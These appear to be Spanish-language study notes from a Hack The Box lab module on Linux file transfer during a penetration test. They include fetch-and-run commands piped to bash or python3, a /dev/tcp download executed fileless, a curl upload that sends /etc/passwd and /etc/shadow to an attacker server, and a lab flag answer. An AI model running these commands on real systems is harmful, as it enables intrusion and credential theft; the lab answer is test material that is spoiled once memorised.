
# 1. Codificando y decodificando en Base64
1. Revisamos el MD5 hash del archivo a transmitir:
```shell-session
Polika4RM@htb[/htb]$ md5sum id_rsa
4e301756a07ded0a2dd6953abf015278  id_rsa
```
2. Lo encriptamos en Base64:
```shell-session
Polika4RM@htb[/htb]$ cat id_rsa |base64 -w 0;echo

LS0tLS... ...5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=
```
3. Lo decodificamos:
```shell-session
Polika4RM@htb[/htb]$ echo -n 'LS0tLS... ...5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=' | base64 -d > id_rsa
```
4. Verficamos el Hash para asegurarnos de que no hemos perdido contenido:
```shell-session
Polika4RM@htb[/htb]$ md5sum id_rsa

4e301756a07ded0a2dd6953abf015278  id_rsa
```

# 2. Web Downloads with Wget and cURL
*wget* y *curl* son dos opciones que muchas distribuciones de Linux traen por defecto para interaccionar con aplicaciones web.  

**Con wget:**
```shell-session
Polika4RM@htb[/htb]$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```
El parámetro -O indica la ruta y directorio de guardado de datos.

Con **curl** podemos hacer lo mismo pero indicando con una **-o**:
```shell-session
Polika4RM@htb[/htb]$ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

# 3. Ataques _Fileless_ en Linux
En Linux, gracias a los pipes (`|`), es posible ejecutar scripts o payloads sin guardarlos en disco.
Esto dificulta la detección, aunque algunos métodos (como mkfifo) pueden generar archivos temporales.

Con curl:
```
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

Con wget + Python:
```
wget -qO- http://servidor/script.py | python3`
```
- Descarga el script y lo ejecuta directamente en Python **sin escribirlo en disco**.


# 4. Descarga con Bash (/dev/tcp)
Cuando no hay herramientas comunes como *wget* o *curl*, Bash (≥ v2.04, compilado con `--enable-net-redirections`) permite realizar conexiones TCP directas mediante `/dev/tcp`.  Esto permite usar la ruta `/dev/tcp/host/puerto` para abrir conexiones de red.
Esto sirve para transferir archivos de forma muy básica.

1. Conectar al servidor web objetivo
```
    exec 3<>/dev/tcp/10.10.10.32/80
```
Abre un descriptor de archivo (`3`) para comunicarse con el puerto 80 del servidor.
   
2. Enviar petición HTTP GET
```
echo -e "GET /LinEnum.sh HTTP/1.1\n\n" >&3`
```    
Solicita el recurso `/LinEnum.sh`.
   
3. Recibir y mostrar la respuesta
```
cat <&3
```
Si lo quisiera guardar en un archivo podría hacer:
```
cat <&3 > LinEnum.sh`
```

Y si lo quiero ejecutar directamente sin guardarlo (fileless), podría hacer:
```
cat <&3 | bash
```

# 5. Descargas con SSH
SCP (Secure Copy) permite copiar archivos y directorios entre hosts usando SSH de forma cifrada.
    - Sintaxis parecida a cp, pero hay que indicar usuario, IP/DNS y credenciales.
    - Puede copiar de local → remoto o de remoto → local.
Configuración del servidor SSH en Pwnbox:
1. Habilitar el servicio SSH:  ```
```
sudo systemctl enable ssh
```
2. Iniciar el servicio:
```
sudo systemctl start ssh
```   
3. Verificar que está escuchando en el puerto 22:
```
netstat -lnpt
```
Debe aparecer `0.0.0.0:22 LISTEN`.

4. Transferencia de archivos con SCP:
Una vez activo el servidor SSH en el atacante, se pueden transferir archivos desde la máquina objetivo hacia nuestro equipo (o al revés) indicando:
```
scp usuario@ip_remota:/ruta/archivo /ruta/local`
```
- /ruta/local: el archivo o carpeta que tienes en tu máquina actual y quieres copiar.
	- Ejemplo: /home/kali/mi_script.sh
- usuario: el nombre de usuario en la máquina remota a la que te conectas por SSH.
	- Ejemplo: root, admin, ubuntu

- ip_remota: la dirección IP o nombre de dominio de la máquina remota (la víctima o tu Pwnbox, según el caso).
	- Ejemplo: 10.10.10.32 o miservidor.com
- /ruta/destino: la carpeta donde quieres dejar el archivo en la máquina remota.
	- Ejemplo: /tmp/ o /home/admin/


# 6. Subidas de archivos
Hay situaciones en que queremos pasar los datos del target al atacante.
Existen diferentes formas: 
## A. Web Upload

1. Instalación del módulo
```
sudo python3 -m pip install --user uploadserver
```
Permite subir archivos vía web.

2. Creamos un certificado auto-firmado (https):
```
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```
- Esto genera un certificado y clave en un solo archivo server.pem.
- Se recomienda no alojar el certificado en el mismo directorio de la web.

3. Preparamos el dierctorio para el servidor HTTPS:
```
mkdir https && cd https
```

4. Iniciamos el servidor con HTTPS:
```
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```
- El servidor escucha en 0.0.0.0:443.
- La ruta para subir archivos: `/upload`.

5. Subimos archivos desde otra máquina (ej. /etc/passwd y /etc/shadow):
```
curl -X POST https://<IP_DEL_SERVIDOR>/upload \ 
-F 'files=@/etc/passwd' \ 
-F 'files=@/etc/shadow' \ 
--insecure
```
- *--insecure* se usa porque el certificado es auto-firmado.
# 7. Método Alternativo de Transferencia de Archivos con Servidor Web
- Linux suele traer Python o PHP instalados, por lo que iniciar un servidor web para transferir archivos es fácil.
- Si el servidor comprometido ya es web, podemos colocar los archivos en el directorio web y descargarlos desde nuestra máquina (Pwnbox).
- Mini servidores web ofrecen flexibilidad: permiten cambiar la ubicación del webroot y el puerto rápidamente, aunque con menor seguridad.


1. Crear un servidor web en Linux:
Con Python 3:
```
python3 -m http.server # Sirve en http://0.0.0.0:8000/
```

Con Python 2.7:
```
`python2.7 -m SimpleHTTPServer # Sirve en http://0.0.0.0:8000/
```

Con PHP:
```
php -S 0.0.0.0:8000 # PHP Development Server en http://0.0.0.0:8000/
```

Con Ruby:
```
ruby -run -ehttpd . -p8000 # WEBrick server en http://0.0.0.0:8000/
```
2. Descargar archivos desde la máquina objetivo a la Pwnbox:
```
wget http://192.168.49.128:8000/filetotransfer.txt
```
- Esto descarga el archivo ubicado en el webroot del servidor comprometido.
- Este método transfiere archivos del objetivo a la máquina atacante, no para subir archivos al objetivo.
- Hay que considerar posibles bloqueos de tráfico entrante por firewall.

# 8. Subida de Archivos con SCP (Secure Copy Protocol)
SCP permite transferir archivos de manera segura usando **SSH (TCP/22)**.
Funciona si el servidor comprometido permite conexiones SSH salientes.
Sintaxis similar a `cp` o `copy`.
1. Subir un archivo al objetivo usando SCP:
```
scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
```
- `htb-student@10.129.86.90`: usuario y dirección del objetivo. 
- `/home/htb-student/`: directorio de destino en la máquina remota.
- Se solicitará la contraseña del usuario remoto.

Salida esperada:
```
htb-student@10.129.86.90's password:  passwd 100% 3414 6.7MB/s 00:00
```
SCP es seguro porque usa **SSH** para la transferencia.
Adecuado para subir archivos cuando el objetivo permite conexiones SSH.
Forma parte de los métodos más comunes de transferencia en Linux, junto con web uploads y servidores web temporales.

----------
**QUESTIONS**
**Answer the question(s) below to complete this Section and earn cubes!
Target(s): 10.129.234.168 (ACADEMY-MISC-NIX04)**

**1. Download the file flag.txt from the web root using Python from the Pwnbox. Submit the contents of the file as your answer.**

Ejecuto simplemente un:
```
wget 10.129.234.168/flag.txt
```
Realizo un cat a flag.txt y obtengo la respuesta: *5d21cf3da9c0ccb94f709e2559f3ea50*


